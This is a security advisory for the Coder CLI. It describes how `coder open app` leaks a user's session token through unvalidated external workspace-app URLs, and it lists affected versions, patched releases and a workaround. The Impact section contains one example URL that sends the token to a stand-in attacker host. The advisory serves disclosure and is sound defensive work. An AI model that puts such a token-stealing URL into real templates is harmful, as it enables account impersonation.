# [H] Coder's session token leaked to arbitrary hosts via `coder open app` for external workspace apps

## Summary
Severity: High
Advisory: GHSA-v54h-cp2w-9x4g
CVE: CVE-2026-55431
CWE: CWE-522, CWE-601
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-07-06
Source: https://github.com/advisories/GHSA-v54h-cp2w-9x4g
Type: github-advisory

## Affected
- Go: `github.com/coder/coder/v2` — affected >=2.34.0 <2.34.2
- Go: `github.com/coder/coder/v2` — affected >=2.33.0 <2.33.8
- Go: `github.com/coder/coder/v2` — affected >=2.30.0 <2.32.7
- Go: `github.com/coder/coder/v2` — affected >=0 <2.29.17

## Details
### Summary

`coder open app` opens external workspace-app URLs without validating the scheme or host. When an external app URL contains the `$SESSION_TOKEN` placeholder the CLI replaces it with the user's real session token before handing the URL to the OS open handler.

> **Note:** Practical exploitation requires the victim to run `coder open app` against a workspace whose external app definition the attacker controls. Only a malicious template author can control external app URLs.

### Impact

Workspace code can register external apps with arbitrary URLs so an attacker who controls workspace contents can define a URL like `https://attacker.example/?t=$SESSION_TOKEN`. Running `coder open app` then sends the user's session token to the attacker and enables full account impersonation for the token's lifetime. The same path can invoke arbitrary local URI scheme handlers. Exploitation requires the user to run `coder open app` against a workspace that contains a malicious external app.

### Patches

The fix applies a URL-scheme allowlist in the CLI and limits `$SESSION_TOKEN` substitution to trusted destinations like the web frontend.

The fix was backported to all supported release lines:

| Release line | Patched version |
|---|---|
| 2.34 | [v2.34.2](https://github.com/coder/coder/releases/tag/v2.34.2) |
| 2.33 | [v2.33.8](https://github.com/coder/coder/releases/tag/v2.33.8) |
| 2.32 | [v2.32.7](https://github.com/coder/coder/releases/tag/v2.32.7) |
| 2.29 (ESR) | [v2.29.17](https://github.com/coder/coder/releases/tag/v2.29.17) |

### Workarounds

Avoid running `coder open app` for untrusted workspaces.

### Resources

- Fix: #26146

### Credits

Coder would like to thank Anthropic's Security Team (ANT-2026-22457) for independently disclosing this issue!

## References
- https://github.com/coder/coder/security/advisories/GHSA-v54h-cp2w-9x4g
- https://github.com/coder/coder/pull/26146
- https://github.com/coder/coder
